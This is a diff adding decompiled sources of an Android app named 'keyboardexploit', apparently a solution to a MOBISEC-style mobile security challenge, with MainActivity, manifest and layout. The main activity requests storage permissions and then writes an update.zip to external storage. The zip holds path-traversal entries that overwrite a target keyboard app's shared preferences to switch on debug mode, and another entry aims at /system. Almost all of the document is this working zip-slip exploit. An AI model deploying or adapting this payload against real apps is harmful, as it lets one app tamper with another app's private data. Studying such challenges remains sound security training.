@@ -1,0 +1,191 @@
+com.mobisec.keyboardexploit.MainActivity
+package com.mobisec.keyboardexploit;
+
+import android.os.Build;
+import android.os.Bundle;
+import android.os.Environment;
+import android.util.Log;
+import android.widget.TextView;
+import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
+import java.io.BufferedOutputStream;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.nio.charset.StandardCharsets;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipOutputStream;
+
+/* loaded from: classes3.dex */
+public class MainActivity extends AppCompatActivity {
+    private static final int REQ_STORAGE = 1337;
+    private static final String TAG = "MOBISEC";
+    private TextView status;
+
+    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        this.status = (TextView) findViewById(R.id.status);
+        this.status.setText("Preparing update.zip...");
+        ensureStoragePermissionAndRun();
+    }
+
+    private void ensureStoragePermissionAndRun() {
+        if (Build.VERSION.SDK_INT < 23) {
+            runExploit();
+            return;
+        }
+        boolean hasWrite = ContextCompat.checkSelfPermission(this, "android.permission.WRITE_EXTERNAL_STORAGE") == 0;
+        boolean hasRead = ContextCompat.checkSelfPermission(this, "android.permission.READ_EXTERNAL_STORAGE") == 0;
+        if (hasWrite && hasRead) {
+            runExploit();
+        } else {
+            ActivityCompat.requestPermissions(this, new String[]{"android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_EXTERNAL_STORAGE"}, REQ_STORAGE);
+        }
+    }
+
+    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, android.app.Activity
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == REQ_STORAGE) {
+            runExploit();
+        }
+    }
+
+    private void runExploit() {
+        new Thread(new Runnable() { // from class: com.mobisec.keyboardexploit.MainActivity$$ExternalSyntheticLambda0
+            @Override // java.lang.Runnable
+            public final void run() {
+                this.f$0.m40lambda$runExploit$2$commobiseckeyboardexploitMainActivity();
+            }
+        }).start();
+    }
+
+    /* renamed from: lambda$runExploit$2$com-mobisec-keyboardexploit-MainActivity, reason: not valid java name */
+    /* synthetic */ void m40lambda$runExploit$2$commobiseckeyboardexploitMainActivity() {
+        try {
+            File ext = Environment.getExternalStorageDirectory();
+            File updateZip = new File(ext, "update.zip");
+            if (updateZip.exists() && !updateZip.delete()) {
+                Log.e(TAG, "Could not delete existing update.zip");
+            }
+            writeUpdateZip(updateZip);
+            final String msg = "Wrote update.zip to " + updateZip.getAbsolutePath() + ". Waiting for target to process it...";
+            Log.e(TAG, msg);
+            runOnUiThread(new Runnable() { // from class: com.mobisec.keyboardexploit.MainActivity$$ExternalSyntheticLambda1
+                @Override // java.lang.Runnable
+                public final void run() {
+                    this.f$0.m38lambda$runExploit$0$commobiseckeyboardexploitMainActivity(msg);
+                }
+            });
+        } catch (Exception e) {
+            final String msg2 = "Exploit error: " + Log.getStackTraceString(e);
+            Log.e(TAG, msg2);
+            runOnUiThread(new Runnable() { // from class: com.mobisec.keyboardexploit.MainActivity$$ExternalSyntheticLambda2
+                @Override // java.lang.Runnable
+                public final void run() {
+                    this.f$0.m39lambda$runExploit$1$commobiseckeyboardexploitMainActivity(msg2);
+                }
+            });
+        }
+    }
+
+    /* renamed from: lambda$runExploit$0$com-mobisec-keyboardexploit-MainActivity, reason: not valid java name */
+    /* synthetic */ void m38lambda$runExploit$0$commobiseckeyboardexploitMainActivity(String msg) {
+        this.status.setText(msg);
+    }
+
+    /* renamed from: lambda$runExploit$1$com-mobisec-keyboardexploit-MainActivity, reason: not valid java name */
+    /* synthetic */ void m39lambda$runExploit$1$commobiseckeyboardexploitMainActivity(String msg) {
+        this.status.setText(msg);
+    }
+
+    private static void writeUpdateZip(File out) throws IOException {
+        byte[] globPrefsXml = "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n<map>\n    <boolean name=\"debugmode\" value=\"true\" />\n    <int name=\"crashes\" value=\"0\" />\n</map>\n".getBytes(StandardCharsets.UTF_8);
+        ZipOutputStream zos = new ZipOutputStream(new BufferedOutputStream(new FileOutputStream(out)));
+        try {
+            ZipEntry e1 = new ZipEntry("../../../data/data/com.mobisec.keyboard/shared_prefs/GlobalKeyboardPrefs.xml");
+            zos.putNextEntry(e1);
+            zos.write(globPrefsXml);
+            zos.closeEntry();
+            ZipEntry e2 = new ZipEntry("../../../system/does_not_matter");
+            zos.putNextEntry(e2);
+            zos.write("boom".getBytes(StandardCharsets.UTF_8));
+            zos.closeEntry();
+            zos.close();
+        } catch (Throwable th) {
+            try {
+                zos.close();
+            } catch (Throwable th2) {
+                th.addSuppressed(th2);
+            }
+            throw th;
+        }
+    }
+}
+
+AndroidManifest.xml
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    android:versionCode="1"
+    android:versionName="1.0"
+    android:compileSdkVersion="34"
+    android:compileSdkVersionCodename="14"
+    package="com.mobisec.keyboardexploit"
+    platformBuildVersionCode="34"
+    platformBuildVersionName="14">
+    <uses-sdk
+        android:minSdkVersion="22"
+        android:targetSdkVersion="34"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <permission
+        android:name="com.mobisec.keyboardexploit.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
+        android:protectionLevel="signature"/>
+    <uses-permission android:name="com.mobisec.keyboardexploit.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"/>
+    <application
+        android:theme="@style/Theme.KeyboardExploit"
+        android:label="@string/app_name"
+        android:debuggable="true"
+        android:allowBackup="true"
+        android:supportsRtl="true"
+        android:extractNativeLibs="true"
+        android:appComponentFactory="androidx.core.app.CoreComponentFactory">
+        <activity
+            android:name="com.mobisec.keyboardexploit.MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <provider
+            android:name="androidx.startup.InitializationProvider"
+            android:exported="false"
+            android:authorities="com.mobisec.keyboardexploit.androidx-startup">
+            <meta-data
+                android:name="androidx.emoji2.text.EmojiCompatInitializer"
+                android:value="androidx.startup"/>
+            <meta-data
+                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
+                android:value="androidx.startup"/>
+        </provider>
+    </application>
+</manifest>
+
+res/layout/activity_main.xml
+<?xml version="1.0" encoding="utf-8"?>
+<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    android:orientation="vertical"
+    android:padding="16dp"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent">
+    <TextView
+        android:textSize="16sp"
+        android:id="@+id/status"
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:text="Starting..."/>
+</LinearLayout>
